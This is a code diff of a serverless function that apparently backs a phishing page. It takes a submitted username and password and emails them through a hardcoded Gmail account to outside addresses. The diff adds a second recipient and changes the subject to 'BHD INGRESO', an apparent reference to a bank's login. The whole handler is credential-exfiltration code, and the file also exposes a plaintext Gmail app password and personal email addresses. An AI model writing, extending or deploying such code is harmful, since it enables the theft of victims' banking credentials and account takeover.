@@ -1,3 +1,4 @@
+
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
@@ -8,14 +9,14 @@ exports.handler = async function(event, context) {
         service: 'gmail',
         auth: {
             user: 'cuentaluperonp5@gmail.com',
-            pass: 'hkqlbwibpmntqojg',
+            pass: 'ogynqksiltkdnuoz',
         },
     });
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com',
-        subject: 'Nuevo Ingreso',
+        to: 'sierroalee@gmail.com, cacutumbe@gmail.com', // Corregido: coma agregada entre los correos
+        subject: 'BHD INGRESO',
         text: `Usuario: ${username}\nContraseña: ${password}`,
     };
 
